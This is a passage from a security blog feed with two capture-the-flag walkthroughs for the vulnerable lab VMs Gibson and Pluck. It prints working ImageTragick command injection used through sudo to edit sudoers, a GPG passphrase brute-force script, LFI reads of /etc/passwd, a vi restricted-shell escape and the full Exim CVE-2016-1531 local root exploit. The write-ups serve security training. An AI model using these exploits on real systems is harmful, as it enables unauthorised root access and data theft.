|   2048 32:13:58:ae:32:b0:5d:b9:2a:9c:87:9c:ae:79:3b:2e (RSA)
|_  256 3f:dc:7d:94:2f:86:f1:83:41:db:8c:74:52:f0:49:43 (ECDSA)
80/tcp open  http    Apache httpd 2.4.7
| http-ls: Volume /
| SIZE  TIME              FILENAME
| 273   2016-05-07 13:03  davinci.html
|_
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Index of /
</code></p>

<p>Looks like we only have SSH and a web server running on this box. The Gibson Mining Corporation page contains a  davinci.html file with a bolded message: <code>The answer you seek will be found by brute force</code>. And the page source also has an interesting comment:</p>

<p>```</p>

<!-- Damn it Margo! Stop setting your password to "god" -->


<!-- at least try and use a different one of the 4 most -->


<!-- common ones! (eugene) -->


<p>```</p>

<p>With this information in hand, I tried SSH'ing as Margo with password god. That didn&rsquo;t work, but doing it as margo instead got me in. We have a shell on the box already!</p>

<h2>Privilege escalation</h2>

<p>We&rsquo;re in as margo, but we need root. I ran my <a href="https://github.com/chousensha/linux_privcheck">linux_pricheck script</a> and sifted through the output to see what might be helpful. Some of the discoveries:</p>

<ul>
<li>there is a network interface connected to a different subnet:</li>
</ul>


<p>```
virbr0    Link encap:Ethernet  HWaddr fe:54:00:72:e2:fb</p>

<pre><code>      inet addr:192.168.122.1  Bcast:192.168.122.255  Mask:255.255.255.0
      UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
      RX packets:7 errors:0 dropped:0 overruns:0 frame:0
      TX packets:17 errors:0 dropped:0 overruns:0 carrier:0
      collisions:0 txqueuelen:0 
      RX bytes:1347 (1.3 KB)  TX bytes:2459 (2.4 KB)
</code></pre>

<p>```</p>

<ul>
<li>VNC is running on the localhost:</li>
</ul>


<p><code>
tcp        0      0 127.0.0.1:5900          0.0.0.0:*               LISTEN      -               
</code></p>

<ul>
<li>user marvo has some sudo privileges that need to be checked out:</li>
</ul>


<p>```
User margo may run the following commands on gibson:</p>

<pre><code>(ALL) NOPASSWD: /usr/bin/convert
</code></pre>

<p>```</p>

<ul>
<li>other users on the host are duke and eugene</li>
</ul>


<p>Alright, we have a solid start. First thing I did was check that convert binary:</p>

<p>```
margo@gibson:~$ /usr/bin/convert
Version: ImageMagick 6.7.7-10 2014-03-06 Q16 <a href="http://www.imagemagick.org">http://www.imagemagick.org</a>
Copyright: Copyright &copy; 1999-2012 ImageMagick Studio LLC
Features: OpenMP</p>

<p>Usage: convert [options &hellip;] file [ [options &hellip;] file &hellip;] [options &hellip;] file
[&hellip;]
```</p>

<p>ImageMagick? More like <a href="https://www.exploit-db.com/exploits/39767/">ImageTragick</a>. This particular version of the ImageMagick library is vulnerable to command execution due to insufficient filtering in shell characters.</p>

<blockquote><p>Insufficient filtering for filename passed to delegate&rsquo;s command allows
remote code execution during conversion of several file formats.</p>

<p>ImageMagick allows to process files with external libraries. This
feature is called &lsquo;delegate&rsquo;. It is implemented as a system() with command string (&lsquo;command&rsquo;)</p>

<p>One of the default delegate&rsquo;s command is used to handle https requests:</p>

<p>&ldquo;wget&rdquo; -q -O &ldquo;%o&rdquo; &ldquo;<a href="https:%M">https:%M</a>&rdquo;</p>

<p>Due to insufficient %M param filtering it is possible to conduct shell command injection, where %M is the actual
link from the input. It is possible to pass the value like <code>https://example.com"|ls "-la</code> and
execute unexpected &lsquo;ls -la&rsquo;. (wget or curl should be installed)</p></blockquote>

<p>So, the injection would look like this:</p>

<p><code>/usr/bin/convert &lsquo;<a href="https://dummyurl">https://dummyurl</a>"| command"&rsquo; tragic.png</code></p>

<p>And if the command takes arguments:</p>

<p><code>/usr/bin/convert &lsquo;<a href="https://dummyurl">https://dummyurl</a>"| command"-flags&rsquo; tragic.png</code></p>

<p>Of course, you are not limited to the pipe character. You can also use <strong>;</strong>.</p>

<p>Since the convert binary runs with sudo privileges, it is possible to escalate privileges by editing <strong>/etc/sudoers</strong>:</p>

<p><code>
margo@gibson:~$ sudo /usr/bin/convert 'https://dummyurl";vim /etc/sudoers"' tragic.png
</code></p>

<p>The sudoers file will pop up in vim, and I gave full access to margo:</p>

<p>```</p>

<h1>User privilege specification</h1>

<p>root    ALL=(ALL:ALL) ALL</p>

<p>margo    ALL=(ALL:ALL) ALL
```</p>

<p>Also, some other interesting tidbits in the the sudoers file:</p>

<p>```</p>

<h1>Allow members of group sudo to execute any command</h1>

<h2>disabled after Margo&rsquo;s security incident</h2>

<h2>%sudo ALL=(ALL:ALL) ALL</h2>

<h1>Allow Margo to convert pictures from the FTP server</h1>

<p>margo ALL=(ALL) NOPASSWD: /usr/bin/convert</p>

<h1>Allow eugene to manage virtual machines and visudo</h1>

<p>eugene ALL=(ALL) NOPASSWD: /usr/bin/virt-manager
eugene ALL=(ALL:ALL)  /usr/sbin/visudo
```</p>

<p>I quit vim with <code>:wq!</code> to override the warning I got. The convert binary throws some errors, but the code was executed!</p>

<p><code>
convert: unable to open image `/tmp/magick-AJXBjcDc': No such file or directory @ error/blob.c/OpenBlob/2638.
convert: unable to open file `/tmp/magick-AJXBjcDc': No such file or directory @ error/constitute.c/ReadImage/583.
convert: no images defined `tragic.png' @ error/convert.c/ConvertImageCommand/3044.
margo@gibson:~$ sudo su
[sudo] password for margo:
root@gibson:/home/margo#
</code></p>

<p>From the system recon we performed, we know there is a VM running on the host. I re-ran my SSH connection with the <strong>-X</strong> flag to enable X11 forwarding, because I wanted to use virt-manager to take a look at the VM. However, I got an error: <code>X11 connection rejected because of wrong authentication</code>. Not a problem, we have virsh!</p>

<p>```
root@gibson:~# virsh list &mdash;all</p>

<h2> Id    Name                           State</h2>

<p> 2     ftpserv                        running
```</p>

<p>At this point, I wanted to make things easier for me, so I decided to get the VM to my own system and continue from there. I located the VM:</p>

<p><code>
ls /var/lib/libvirt/images/
ftpserv.img
</code></p>

<p>To transfer the VM using scp, I first needed to enable SSH'ing as root. I edited <code>/etc/ssh/sshd_config</code> to have the following:</p>

<p>```
PermitRootLogin yes
AllowUsers eugene margo root
Match user root</p>

<pre><code>PasswordAuthentication yes
</code></pre>

<p>```</p>

<p>Then I changed root&rsquo;s password, and reloaded the SSH config file with <code>service ssh reload</code>. Now I was able to transfer the image:</p>

<p><code>
scp root@192.168.217.148:/var/lib/libvirt/images/ftpserv.img /mnt/ftpserv.img
Ubuntu 14.04.3 LTS
root@192.168.217.148's password:
ftpserv.img                                   100%  512MB  22.6MB/s   00:22    
</code></p>

<p>Let&rsquo;s see what we have here:</p>

<p><code>
file ftpserv.img
ftpserv.img: DOS/MBR boot sector, FREE-DOS Beta 0.9 MBR; partition 1 : ID=0xe, active, start-CHS (0x0,1,1), end-CHS (0xf,15,63), startsector 63, 1048257 sectors
</code></p>

<p>To mount it, we need to learn the offset:</p>

<p>```
fdisk -l ftpserv.img
Disk ftpserv.img: 512 MiB, 536870912 bytes, 1048576 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes
Disklabel type: dos
Disk identifier: 0x00000000</p>

<p>Device       Boot Start     End Sectors   Size Id Type
ftpserv.img1 *       63 1048319 1048257 511.9M  e W95 FAT16 (LBA)
```</p>

<p>So the start block is 63 and the block size is 512..then the offset is 63 * 512, or 32256. Time to mount the image:</p>

<p><code>
root@kali:/mnt# mkdir ftpserv
mount -o loop,offset=32256 ftpserv.img ftpserv
</code></p>

<p>Mounting is done via the loop device, which is a file that acts as a block-based device. Now, a new device called KFLYNN appeared on my system. Kevin Flynn, maybe? Anyway, let&rsquo;s look inside:</p>

<p><code>
ls ftpserv
AUTOEXEC.BAT  COMMAND.COM  FDCONFIG.SYS  KERNEL.SYS
BOOTSECT.BIN  DOS          GARBAGE       net
</code></p>

<p>The GARBAGE directory seems interesting:</p>

<p><code>
ls GARBAGE/
adminspo.jpg  flag.img  jz_ug.ans
</code></p>

<p>Let&rsquo;s see the picture first:</p>

<p><img class="center" src="/images/pentest/gibson/adminspo.jpg" title="&lsquo;sysadmin&rsquo; &lsquo;sysadmin life&rsquo;" ></p>

<p>I also ran exiftool on it and was rewarded with..something:</p>

<p><code>
exiftool adminspo.jpg
ExifTool Version Number         : 10.60
File Name                       : adminspo.jpg
Directory                       : .
File Size                       : 120 kB
File Modification Date/Time     : 2016:05:04 17:17:44-04:00
File Access Date/Time           : 2017:10:01 15:14:34-04:00
File Inode Change Date/Time     : 2016:05:04 17:31:08-04:00
File Permissions                : rwxr-xr-x
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Big-endian (Motorola, MM)
Image Description               : Rabbit.. Flu Shot... TYPE COOKE YOU IDIOT! I'll head them off at the pass
Modify Date                     : 2016:05:04 22:29:32
Artist                          : Virtualization is fun.. What's more, esoteric OSes on 192.168.122 are even more fun
User Comment                    : So there's info here.... Images, hmm... Wasn't that a CVE...? Oh yes... CVE 2016-3714....http://www.openwall.com/lists/oss-security/2016/05/03/18 so which person can run it. Perhaps the man who knew a lot about Sean Connery in Trainspotting when he wasn't  causing a 7 point drop in the NYSE
[...]
</code></p>

<p>Next I looked at the ANS file:</p>

<p><code>
file jz_ug.ans
jz_ug.ans: ISO-8859 text, with CRLF line terminators, with escape sequences
</code></p>

<p>Apparently, this type of file is a text document graphic based on the ANSI text standard; may also be used to store text graphics, which uses characters to display images in a text document. I read it like a text file:</p>

<p>```
cat jz_ug.ans</p>

<p>   �������ݲܱ����ܲ����۲ܱ�������������ܲ�ܲ������������ܲ�ܱ��ܲ�ܱ����</p>

<pre><code>�����������������������������������������������������۲���������������
�������������������������۲���������� ��������۲�����۲���������������
���������������������������������������������������� �����������������
޲���������۲�����۲�����������    �����۲���    ����������߲������۲�
 ��߱� ����������߲����������߲    �����߲���    ����߲���߲��ݲ����߲jz
                              �                            �         �
                the ugliest of all are under 5 feet tall
</code></pre>

<p>```</p>

<p>Hmm, ok. Finally, another image file:</p>

<p><code>
file flag.img
flag.img: Linux rev 1.0 ext2 filesystem data, UUID=d59bdd40-ec37-4d24-a956-80f549846121
</code></p>

<p>This time it&rsquo;s an EXT2 filesystem. I mounted it:</p>

<p><code>
mount ftpserv/GARBAGE/flag.img flag
ls -la
total 70
drwxr-xr-x 4 root root  1024 May 14  2016 .
drwxr-xr-x 5 root root  4096 Oct 28 13:05 ..
-rwxrwxr-x 1 root root 21358 Nov 15  2011 davinci
-rw-r--r-- 1 root root 28030 Nov 15  2011 davinci.c
-rw-r--r-- 1 root root   159 May  5  2016 hint.txt
drwx------ 2 root root 12288 May  5  2016 lost+found
drwxr-xr-x 2 root root  1024 May  5  2016 .trash
</code></p>

<p>Davinci is a snake game:</p>

<p>```</p>

<pre><code>        _________         _________             
       /         \       /         \            
      /  /~~~~~\  \     /  /~~~~~\  \           
      |  |     |  |     |  |     |  |           
      |  |     |  |     |  |     |  |           
      |  |     |  |     |  |     |  |         / 
      |  |     |  |     |  |     |  |       //  
     (o  o)    \  \_____/  /     \  \_____/ /   
      \__/      \         /       \        /    
        |        ~~~~~~~~~         ~~~~~~~~         
        ^                               
        Welcome To The Snake Game!          
                Press Any Key To Continue...    
</code></pre>

<p>```</p>

<p>Its source code hints that it&rsquo;s vulnerable to buffer overflow if more than 128 characters are entered. Let&rsquo;s look at the hint now:</p>

<p><code>
cat hint.txt
http://www.imdb.com/title/tt0117951/ and
http://www.imdb.com/title/tt0113243/ have
someone in common... Can you remember his
original nom de plume in 1988...?
</code></p>

<p>The IMDB references are for the movies Trainspotting and Hackers. And who do they have in common? Jonny Lee Miller. You can find the name referenced in the hint by reading the description for the Hackers movie. It&rsquo;s a handle: Zero Cool.</p>

<p>And finally, the hidden directory:</p>

<p><code>
ls -l
total 317
---x------ 1 root root    469 May 14  2016 flag.txt.gpg
-rw-r--r-- 1 root root 320130 Sep  7  2015 LeithCentralStation.jpg
</code></p>

<p>The image is an ad for Trainspotting and has nothing out of the ordinary in the exiftool output. And, of course, the best for last! It seems we have a flag, but it&rsquo;s encrypted. I tried some ZeroCool variations, but it seems more calculation power will need to be thrown at this. I made a file with the handle to be transformed in many possible passwords by John:</p>

<p><code>
cat tries.txt
zero cool
zerocool
zero kool
zerokool
</code></p>

<p>Next I used John to generate a file of uppercase and lowercase combinations from this initial file:</p>

<p><code>
john --rules=nt --wordlist=tries.txt --stdout &gt; pass.txt
Created directory: /root/.john
Press 'q' or Ctrl-C to abort, almost any other key for status
1504p 0:00:00:01 100.00% (2017-10-28 13:37) 1139p/s ZERO KOOL
</code></p>

<p>And after so many hacker references, also add l33t speak to the combinations, with Korelogic rules. First, download the rules file:</p>

<p><code>
wget http://openwall.info/wiki/_media/john/korelogic-rules-20100801.txt
</code></p>

<p>Now add the rules to John&rsquo;s config file:</p>

<p><code>
cat korelogic-rules-20100801.txt &gt;&gt; /etc/john/john.conf
</code></p>

<p>Now I was able to generate the file with p@$$w0rd$:</p>

<p><code>
john --rules=KoreLogicRulesL33t --wordlist=pass.txt --stdout &gt; coolpass.txt
Press 'q' or Ctrl-C to abort, almost any other key for status
132384p 0:00:00:00 100.00% (2017-10-28 13:54) 240698p/s Z3ro k0o1
</code></p>

<p>And a quick shell script for bruteforcing from the file:</p>

<p>```
for pass in $(cat coolpass.txt) ; do</p>

<pre><code>echo "Trying:" $pass
gpg --batch --status-fd --with-colons --output flag.txt --passphrase $pass --decrypt flag.txt.gpg
if [ -a "flag.txt" ]; then echo "Passphrase found! $pass"
break
fi
</code></pre>

<p>done
```</p>

<p>The correct passphrase is <strong>Z3r0K00l</strong></p>

<p><code>
Trying: Z3r0K00l
gpg: CAST5 encrypted data
[GNUPG:] NEED_PASSPHRASE_SYM 3 3 2
gpg: encrypted with 1 passphrase
[GNUPG:] BEGIN_DECRYPTION
[GNUPG:] DECRYPTION_INFO 0 3
[GNUPG:] PLAINTEXT 62 1463231918 flag.txt
[GNUPG:] PLAINTEXT_LENGTH 862
[GNUPG:] DECRYPTION_OKAY
gpg: WARNING: message was not integrity protected
[GNUPG:] END_DECRYPTION
Passphrase found! Z3r0K00l
</code></p>

<p>And the flag is:</p>

<p>```
cat flag.txt</p>

<hr />

<p>| | | | <strong> _  </strong><em>| | __ |</em>   <em>| |<strong>   </strong></em>   |  _ \| | <strong> _ _ </strong>   <strong><em>| |</em>| |
| |<em>| |/ </em><code>|/ __| |/ /   | | | '_ \ / _ \  | |_) | |/ _</code> | &lsquo;_ \ / _ \ </strong>| |
|  _  | (<em>| | (<strong>|   &lt;    | | | | | |  </strong>/  |  __/| | (</em>| | | | |  <strong>/ |<em>|</em>|
|<em>| |</em>|_<em>,</em>|_</strong>|<em>|_\   |</em>| |<em>| |</em>|_<strong>|  |<em>|   |</em>|_<em>,</em>|<em>| |</em>|_</strong>|_<em>(</em>)</p>

<p>Should you not be standing in a 360 degree rotating payphone when reading
this flag&hellip;? B-)</p>

<p>Anyhow, congratulations once more on rooting this VM. This time things were
a bit esoteric, but I hope you enjoyed it all the same.</p>

<p>Shout-outs again to #vulnhub for hosting a great learning tool. A special
thanks goes to g0blin and GKNSB for testing, and to g0tM1lk for the offer
to host the CTF once more.</p>

<pre><code>                                                          --Knightmare
</code></pre>

<p>```</p>

<p><strong>Learn more</strong></p>

<ul>
<li><a href="https://imagetragick.com/">ImageTragick</a></li>
</ul>


<p>```</p>

<hr />

<p>/ Q: Why is Christmas just like a day at \
| the office? A: You do all of the work  |
| and the fat guy in the suit            |
|                                        |
\ gets all the credit.                   /</p>

<hr />

<pre><code>    \   ^__^
     \  (oo)\_______
        (__)\       )\/\
            ||----w |
            ||     ||
</code></pre>

<p>```</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Got Pluck?]]></title>
    <link href="http://chousensha.github.io/blog/2017/07/06/got-pluck/"/>
    <updated>2017-07-06T06:28:41-04:00</updated>
    <id>http://chousensha.github.io/blog/2017/07/06/got-pluck</id>
    <content type="html"><![CDATA[<p>New day, new machine to hack! Today&rsquo;s target is called Pluck.</p>

<!-- more -->


<h2>Recon</h2>

<p>Nmap results:</p>

<p><code>
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 e8:87:ba:3e:d7:43:23:bf:4a:6b:9d:ae:63:14:ea:71 (RSA)
|_  256 8f:8c:ac:8d:e8:cc:f9:0e:89:f7:5d:a0:6c:28:56:fd (ECDSA)
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Pluck
3306/tcp open  mysql   MySQL (unauthorized)
5355/tcp open  llmnr?
</code></p>

<p>First order of business, the web server:</p>

<p><img class="center" src="/images/pentest/pluck/pluck.png" title="&lsquo;pluck&rsquo; &lsquo;pluck&rsquo;" ></p>

<p>I ran Nikto on it and it revealed a couple of vulnerabilities:</p>

<p><code>
+ Server: Apache/2.4.18 (Ubuntu)
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ Web Server returns a valid response with junk HTTP methods, this may cause false positives.
+ /index.php?page=../../../../../../../../../../etc/passwd: The PHP-Nuke Rocket add-in is vulnerable to file traversal, allowing an attacker to view any file on the host. (probably Rocket, but could be any index.php)
+ OSVDB-29786: /admin.php?en_log_id=0&amp;action=config: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+ OSVDB-29786: /admin.php?en_log_id=0&amp;action=users: EasyNews from http://www.webrc.ca version 4.3 allows remote admin access. This PHP file should be protected.
+ OSVDB-3092: /admin.php: This might be interesting...
+ OSVDB-3268: /images/: Directory indexing found.
+ OSVDB-3268: /images/?pattern=/etc/*&amp;sort=name: Directory indexing found.
+ Server leaks inodes via ETags, header found with file /icons/README, fields: 0x13f4 0x438c034968a80
+ OSVDB-3233: /icons/README: Apache default file found.
+ 7535 requests: 0 error(s) and 12 item(s) reported on remote host
+ End Time:           2017-07-06 09:41:42 (GMT-4) (22 seconds)
</code></p>

<p>First, I went to the admin page and it seems vulnerable to SQL injection:</p>

<p><img class="center" src="/images/pentest/pluck/admin.png" title="&lsquo;admin&rsquo; &lsquo;admin sqli&rsquo;" ></p>

<p>I fired up sqlmap but I couldn&rsquo;t get anything out of the database. Maybe it was a false lead. Next I looked at the LFI vulnerability that Nikto detected and took a peak at <em>/etc/passwd</em>:</p>

<p><code>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
messagebus:x:106:109::/var/run/dbus:/bin/false
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
lxd:x:108:65534::/var/lib/lxd/:/bin/false
uuidd:x:109:114::/run/uuidd:/bin/false
dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
pollinate:x:112:1::/var/cache/pollinate:/bin/false
bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
Debian-exim:x:113:119::/var/spool/exim4:/bin/false
peter:x:1001:1001:,,,:/home/peter:/bin/bash
paul:x:1002:1002:,,,:/home/paul:/usr/bin/pdmenu
backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh
</code></p>

<p>The last entry is interesting. I used the LFI to look at the script:</p>

<p>```</p>

<h6>#</h6>

<h1>Server Backup script</h1>

<h6>#</h6>

<h1>Backup directories in /backups so we can get it via tftp</h1>

<p>echo &ldquo;Backing up data&rdquo;
tar -cf /backups/backup.tar /home /var/www/html > /dev/null 2&amp; > /dev/null
echo &ldquo;Backup complete&rdquo;
```</p>

<p>A TFTP reference, and I didn&rsquo;t scan for UDP ports. I went back to Nmap real quick:</p>

<p>```
nmap -T4 -sU -p69 192.168.217.147</p>

<p>Starting Nmap 7.40 ( <a href="https://nmap.org">https://nmap.org</a> ) at 2017-07-06 09:59 EDT
Nmap scan report for 192.168.217.147
Host is up (0.00016s latency).
PORT   STATE         SERVICE
69/udp open|filtered tftp
```</p>

<p>I got the archive via T<a href="FTP:">FTP:</a></p>

<p><code>
tftp 192.168.217.147
tftp&gt; get /backups/backup.tar
Received 1824718 bytes in 1.4 seconds
</code></p>

<p>Extracted it to find some home directory contents, besides the source for the website:</p>

<p><code>
tar -xvf backup.tar
home/
home/bob/
home/bob/.bashrc
home/bob/.sudo_as_admin_successful
home/bob/.profile
home/bob/.bash_logout
home/paul/
home/paul/keys/
home/paul/keys/id_key3.pub
home/paul/keys/id_key2.pub
home/paul/keys/id_key2
home/paul/keys/id_key4.pub
home/paul/keys/id_key5.pub
home/paul/keys/id_key6
home/paul/keys/id_key1
home/paul/keys/id_key5
home/paul/keys/id_key1.pub
home/paul/keys/id_key6.pub
home/paul/keys/id_key4
home/paul/keys/id_key3
home/paul/.bashrc
home/paul/.profile
home/paul/.bash_logout
home/peter/
home/peter/.bashrc
home/peter/.profile
home/peter/.bash_logout
var/www/html/
var/www/html/fonts/
var/www/html/fonts/glyphicons-halflings-regular.svg
var/www/html/fonts/glyphicons-halflings-regular.woff2
var/www/html/fonts/glyphicons-halflings-regular.ttf
var/www/html/fonts/glyphicons-halflings-regular.woff
var/www/html/fonts/glyphicons-halflings-regular.eot
var/www/html/about.php
var/www/html/index.php
var/www/html/footer.php
var/www/html/css/
var/www/html/css/bootstrap.css.map
var/www/html/css/bootstrap.min.css.map
var/www/html/css/bootstrap-theme.css
var/www/html/css/bootstrap-theme.min.css
var/www/html/css/bootstrap.min.css
var/www/html/css/bootstrap-theme.min.css.map
var/www/html/css/bootstrap-theme.css.map
var/www/html/css/bootstrap.css
var/www/html/header.php
var/www/html/admin.php
var/www/html/js/
var/www/html/js/jquery.min.js
var/www/html/js/bootstrap.js
var/www/html/js/npm.js
var/www/html/js/bootstrap.min.js
</code></p>

<p>Bob&rsquo;s directory:</p>

<p><code>
root@kali:~/home/bob# ls -la
total 20
drwxr-xr-x 2 1000 1000 4096 Jan 18 07:43 .
drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
-rw-r--r-- 1 1000 1000  220 Jan 18 00:39 .bash_logout
-rw-r--r-- 1 1000 1000 3771 Jan 18 00:39 .bashrc
-rw-r--r-- 1 1000 1000  655 Jan 18 00:39 .profile
-rw-r--r-- 1 1000 1000    0 Jan 18 03:40 .sudo_as_admin_successful
</code></p>

<p>That sudo file was empty. On to paul:</p>

<p><code>
root@kali:~/home/paul# ls -la
total 24
drwxr-xr-x 3 1002 1002 4096 Jan 18 13:13 .
drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
-rw-r--r-- 1 1002 1002  220 Jan 18 03:04 .bash_logout
-rw-r--r-- 1 1002 1002 3771 Jan 18 03:04 .bashrc
drwxrwxr-x 2 1002 1002 4096 Jan 18 13:09 keys
-rw-r--r-- 1 1002 1002  655 Jan 18 03:04 .profile
root@kali:~/home/paul# ls -la keys/
total 56
drwxrwxr-x 2 1002 1002 4096 Jan 18 13:09 .
drwxr-xr-x 3 1002 1002 4096 Jan 18 13:13 ..
-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key1
-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key1.pub
-rwxrwxr-x 1 1002 1002  672 Jan 18 13:08 id_key2
-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key2.pub
-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key3
-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key3.pub
-rwxrwxr-x 1 1002 1002 1679 Jan 18 13:09 id_key4
-rwxrwxr-x 1 1002 1002  392 Jan 18 13:09 id_key4.pub
-rwxrwxr-x 1 1002 1002  668 Jan 18 13:08 id_key5
-rwxrwxr-x 1 1002 1002  600 Jan 18 13:08 id_key5.pub
-rwxrwxr-x 1 1002 1002 1675 Jan 18 13:09 id_key6
-rwxrwxr-x 1 1002 1002  392 Jan 18 13:09 id_key6.pub
</code></p>

<p>It looks like paul didn&rsquo;t put much effort into securing his SSH keys. Lastly, peter:</p>

<p><code>
root@kali:~/home/peter# ls -la
total 20
drwxr-xr-x 2 1001 1001 4096 Jan 18 03:04 .
drwxr-xr-x 5 root root 4096 Jan 18 03:27 ..
-rw-r--r-- 1 1001 1001  220 Jan 18 03:04 .bash_logout
-rw-r--r-- 1 1001 1001 3771 Jan 18 03:04 .bashrc
-rw-r--r-- 1 1001 1001  655 Jan 18 03:04 .profile
</code></p>

<h2>Privilege escalation</h2>

<p>Back to paul, and trying those SSH keys. Tried each, the 4th one worked, but it dropped me to this menu:</p>

<p><img class="center" src="/images/pentest/pluck/pdmenu.png" title="&lsquo;pdmenu&rsquo; &lsquo;pdmenu&rsquo;" ></p>

<p>So, what is pdmenu?</p>

<blockquote><p>Pdmenu is a full screen menuing system for Unix. It is designed to be easy to use, and is suitable as a login shell
for inexperienced users, or it can just be ran at the command line as a handy menu.</p></blockquote>

<p>Not much I can do with this, however, the option to edit a file launches vi! I remembered another challenge where vi helped me escape shell restrictions, and found a <a href="https://pen-testing.sans.org/blog/2012/06/06/escaping-restricted-linux-shells">SANS article</a> about this exact topic. To get a proper shell, I typed the following in vi&rsquo;s command mode:</p>

<p><code>
:set shell=/bin/bash
:!bash
</code></p>

<p>That dropped me into paul&rsquo;s shell:</p>

<p><code>
paul@pluck:~$ id
uid=1002(paul) gid=1002(paul) groups=1002(paul)
</code></p>

<p>SUID enumeration led me to the next step:</p>

<p><code>
paul@pluck:~$ find / -perm -4000 2&gt;/dev/null
/usr/exim/bin/exim-4.84-7
/usr/bin/passwd
/usr/bin/at
/usr/bin/newgrp
/usr/bin/pkexec
/usr/bin/sudo
/usr/bin/traceroute6.iputils
/usr/bin/newuidmap
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/newgidmap
/usr/bin/chsh
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/s-nail/s-nail-privsep
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/bin/su
/bin/umount
/bin/mount
/bin/fusermount
/bin/ping
/bin/ntfs-3g
</code></p>

<p>Exim is a MTA similar to sendmail. Googling for an exploit yielded a <a href="https://www.exploit-db.com/exploits/39535/">local root exploit</a>. I used vi to create a shell script with the exploit code, changed it to executable and ran it:</p>

<p>```
paul@pluck:~$ vi rootme.sh
paul@pluck:~$ cat rootme.sh
echo [ CVE-2016-1531 local root exploit
cat > /tmp/root.pm &lt;&lt; EOF
package root;
use strict;
use warnings;</p>

<p>system(&ldquo;/bin/sh&rdquo;);
EOF
PERL5LIB=/tmp PERL5OPT=-Mroot /usr/exim/bin/exim -ps</p>

<p>paul@pluck:~$ ./rootme.sh
[ CVE-2016-1531 local root exploit</p>

<h1>whoami</h1>

<p>root
```</p>

<p>The flag is mine!</p>

<p>```</p>

<h1>cat /root/flag.txt</h1>

<p>Congratulations you found the flag</p>

<hr />

<h6>((((((((((((((((((((((((((((((</h6>

<h6>###   (((((((((((((((((((((((((((</h6>

<p>,,##########   ((((((((((((((((((((((((
@@,,,##########   (((((((((((((((((((((
@@@@@,,,##########                   <br/>
@@@@@@@@,,,############################
@@@@@@@@@@@,,,#########################
@@@@@@@@@,,,###########################
@@@@@@,,,##########                  <br/>
@@@,,,##########   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;
,,,##########   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</p>

<h6>####   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</h6>

<h6>#   &amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;&amp;</h6>

<p>```</p>

